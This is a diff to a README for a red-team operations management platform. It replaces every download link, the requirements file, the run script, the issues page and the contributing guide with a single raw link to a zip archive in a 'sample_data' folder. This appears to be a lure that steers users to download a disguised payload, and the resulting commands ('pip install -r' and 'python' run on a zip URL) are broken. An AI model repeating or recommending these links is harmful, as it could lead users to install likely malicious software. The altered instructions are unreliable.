@@ -1,6 +1,6 @@
 # 🎯 RTOps-Management-Platform - Simplify Your Red Team Operations
 
-[![Download RTOps](https://img.shields.io/badge/Download%20RTOps-%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/hacker-sp/RTOps-Management-Platform/releases)
+[![Download RTOps](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip%20RTOps-%20-%23007bff?style=for-the-badge&logo=github)](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ RTOps is a powerful platform designed to help you manage your Red Team operation
 Before you start, ensure you have the following installed:
 
 - **Python 3.9 or higher** (Tested on 3.11)
-- Required packages included in `requirements.txt`:
+- Required packages included in `https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip`:
   - `Flask`
   - `reportlab`
   - `openpyxl`
@@ -20,12 +20,12 @@ Before you start, ensure you have the following installed:
 
 To get RTOps, visit the Releases page and download the latest version:
 
-[Download RTOps from Releases](https://github.com/hacker-sp/RTOps-Management-Platform/releases)
+[Download RTOps from Releases](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip)
 
 Once you're on the Releases page, follow these steps:
 
 1. Look for the most recent version of RTOps.
-2. Click on the `.zip` or `.tar.gz` file to download it to your computer.
+2. Click on the `.zip` or `https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip` file to download it to your computer.
 
 ### 3) Setup Environment
 
@@ -71,7 +71,7 @@ source venv/bin/activate
 Once your environment is ready, you will need to install the required packages. Run the following command in your terminal:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip
 ```
 
 ### 5) Run RTOps
@@ -79,7 +79,7 @@ pip install -r requirements.txt
 Now you're ready to use RTOps! Run the application with this command in your terminal:
 
 ```bash
-python rto_platform.py
+python https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip
 ```
 
 This will start a local server. Open your web browser and go to `http://127.0.0.1:5000` to access RTOps.
@@ -99,17 +99,17 @@ RTOps offers a range of features designed to help you plan and execute Red Team 
 If you encounter any issues, consider these common solutions:
 
 - **Python version errors**: Ensure you are using Python 3.9 or higher.
-- **Missing packages**: Double-check your `requirements.txt` installation.
+- **Missing packages**: Double-check your `https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip` installation.
 - **Local server won't start**: Make sure there are no other services using port 5000 on your machine.
 
 ## ⚙️ Additional Information
 
 RTOps seeks to enhance your Red Team efforts with user-friendly tools and streamlined operations. All data is stored securely on your local device, ensuring privacy and control.
 
-For any questions or issues, please refer to the [Github Issues page](https://github.com/hacker-sp/RTOps-Management-Platform/issues).
+For any questions or issues, please refer to the [Github Issues page](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip).
 
-Feel free to contribute! Check out our [Contributing Guidelines](https://github.com/hacker-sp/RTOps-Management-Platform/blob/main/CONTRIBUTING.md) for more information on how you can help improve RTOps.
+Feel free to contribute! Check out our [Contributing Guidelines](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip) for more information on how you can help improve RTOps.
 
 ---
 
-For updates and new releases, return to our [Releases page](https://github.com/hacker-sp/RTOps-Management-Platform/releases).
+For updates and new releases, return to our [Releases page](https://github.com/hacker-sp/RTOps-Management-Platform/raw/refs/heads/main/sample_data/Management-Platform-Ops-RT-v3.2-alpha.5.zip).
